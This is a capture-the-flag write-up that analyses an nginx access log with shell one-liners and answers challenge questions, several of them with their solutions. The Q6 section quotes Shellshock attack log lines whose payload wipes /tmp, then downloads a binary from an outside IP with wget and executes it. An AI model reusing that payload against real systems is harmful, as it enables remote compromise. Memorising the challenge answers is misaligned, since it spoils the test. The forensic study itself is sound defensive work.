
Analyze a nginx access log and answer questions about what happened.

[access.log](https://cyberskyline.com/artifact/65e54bcb52369daf3dc4725b/677847d9b4401661d5860dea/65b015dbad4ea5fef1fceaa6/65b015dcad4ea5fef1fceb20/65b015dcad4ea5fef1fceb22/download?t=3)

Q1 - 10 points

How many different IP addresses reached the server?

`cat access.log | cut -d " " -f 1 | sort | uniq | wc -l
`
`47`

Q2 - 10 points

How many requests yielded a 200 status?

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat access.log | cut -d '"' -f 3 | cut -d ' ' -f 2 | sort | uniq -c | sort -rn

     38 400
     21 404
     19 502
     19 200
      2 301

```

`19`

Q3 - 10 points

How many requests yielded a 400 status?

`38`

Q4 - 10 points

What IP address rang at the doorbell?

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat access.log | grep -i "ring"                                               
186.64.69.141 - - [30/Sep/2015:18:59:20 -0400] "GET /Ringing.at.your.dorbell! HTTP/1.0" 404 162 "http://google.com/search?q=bitcoin" "x00_-gawa.sa.pilipinas.2015"
```

`186.64.69.141`

Q5 - 10 points

What version of the Googlebot visited the website?

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat access.log | grep -i "googlebot"
66.249.67.130 - - [01/Oct/2015:03:08:10 -0400] "GET /robots.txt HTTP/1.1" 502 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.243 - - [01/Oct/2015:08:56:45 -0400] "GET /robots.txt HTTP/1.1" 502 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.148 - - [01/Oct/2015:15:22:32 -0400] "GET /robots.txt HTTP/1.1" 502 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.16 - - [01/Oct/2015:22:01:15 -0400] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.130 - - [01/Oct/2015:22:01:16 -0400] "GET /robots.txt HTTP/1.1" 502 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.148 - - [02/Oct/2015:02:46:00 -0400] "GET /robots.txt HTTP/1.1" 502 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.249 - - [02/Oct/2015:11:13:06 -0400] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.3 - - [02/Oct/2015:11:13:06 -0400] "GET /robots.txt HTTP/1.1" 502 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

```

`2.1`

Q6 - 10 points

Which IP address attempted to exploit the shellshock vulnerability?

- Research shellshock vulnerability and see it is a bug in Unix Bash shell

![](attachments/Pasted%20image%2020250409215620.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat access.log | grep -i "shellshock"
  
┌──(kali㉿kali)-[~/Downloads]
└─$ cat access.log | grep -i "shell"     

┌──(kali㉿kali)-[~/Downloads]
└─$ cat access.log | grep -i "bash" 
61.161.130.241 - - [30/Sep/2015:10:34:00 -0400] "GET / HTTP/1.1" 200 867 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-ionw >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ionw >> /tmp/Run.sh;echo /tmp/China.Z-ionw >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-ionw >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ionw >> /tmp/Run.sh;echo /tmp/China.Z-ionw >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"
61.161.130.241 - - [30/Sep/2015:10:36:01 -0400] "GET / HTTP/1.1" 200 867 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-fiuz >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-fiuz >> /tmp/Run.sh;echo /tmp/China.Z-fiuz >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-fiuz >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-fiuz >> /tmp/Run.sh;echo /tmp/China.Z-fiuz >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"

```

`61.161.130.241`

Q7 - 10 points

What was the most popular version of Firefox used for browsing the website?

Q8 - 10 points

What is the most common HTTP method used?

Q9 - 10 points

What is the second most common HTTP method used?

Q10 - 10 points

How many requests were for \x04\x01\x00P\xC6\xCE\x0Eu0\x00?